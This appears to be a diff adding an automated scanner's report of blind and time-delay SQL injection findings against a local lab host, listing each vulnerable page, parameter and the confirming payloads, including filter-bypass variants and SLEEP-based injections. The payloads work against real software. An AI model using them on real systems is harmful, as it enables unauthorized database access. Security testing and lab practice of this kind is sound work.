@@ -1,0 +1,114 @@
+Target: http://192.168.42.133 (GET)
+
+---
+URL:http://192.168.42.133/sqli/example1.php (GET)
+VulnName: blind sqli
+Query: {'name': 'root'}
+Payload: '	and	'86660'='86660
+'	and	'79685'='79685
+'	or	48311=48311#
+'	and	'2091'='2092
+Advice: use orm
+Database: unknown
+---
+---
+URL:http://192.168.42.133/sqli/example2.php (GET)
+VulnName: blind sqli
+Query: {'name': 'root'}
+Payload: '	and	'86660'='86660
+'	and	'79685'='79685
+'	or	48311=48311#
+'	and	'2091'='2092
+Advice: use orm
+Database: unknown
+---
+---
+URL:http://192.168.42.133/sqli/example4.php (GET)
+VulnName: blind sqli
+Query: {'id': '2'}
+Payload: 	and	1375=1375
+	and	76195=76195
+	or	35746=35746#
+	and	1749=1750
+Advice: use orm
+Database: unknown
+---
+---
+URL:http://192.168.42.133/sqli/example5.php (GET)
+VulnName: blind sqli
+Query: {'id': '2'}
+Payload: 	and	1375=1375
+	and	76195=76195
+	or	35746=35746#
+	and	1749=1750
+Advice: use orm
+Database: unknown
+---
+---
+URL:http://192.168.42.133/sqli/example6.php (GET)
+VulnName: blind sqli
+Query: {'id': '2'}
+Payload: 	and	1375=1375
+	and	76195=76195
+	or	35746=35746#
+	and	1749=1750
+Advice: use orm
+Database: unknown
+---
+---
+URL:http://192.168.42.133/sqli/example3.php (GET)
+VulnName: blind sqli
+Query: {'name': 'root'}
+Payload: '/**/and/**/'19549'='19549
+'/**/and/**/'21449'='21449
+'/**/or/**/71843=71843#
+'/**/and/**/'35099'='35100
+Advice: use orm
+Database: unknown
+---
+---
+URL:http://192.168.42.133/sqli/example7.php (GET)
+VulnName: blind sqli
+Query: {'id': '2'}
+Payload: 
+and
+52021=52021
+
+and
+3602=3602
+
+or
+16480=16480#
+
+and
+36131=36132
+Advice: use orm
+Database: unknown
+---
+---
+URL:http://192.168.42.133/xml/example2.php (GET)
+VulnName: blind sqli
+Query: {'name': 'hacker'}
+Payload: '+and+'67724'='67724
+'+and+'80694'='80694
+'+or+93323=93323#
+'+and+'11484'='11485
+Advice: use orm
+Database: unknown
+---
+---
+URL:http://192.168.42.133/sqli/example8.php (GET)
+VulnName: time delay sqli vuln
+Query: {'order': 'name'}
+Payload: ` or SLEEP(3);-- 
+Advice: use orm
+Database: unknown
+---
+---
+URL:http://192.168.42.133/sqli/example9.php (GET)
+VulnName: time delay sqli vuln
+Query: {'order': 'name'}
+Payload:  or SLEEP(3);-- 
+Advice: use orm
+Database: unknown
+---
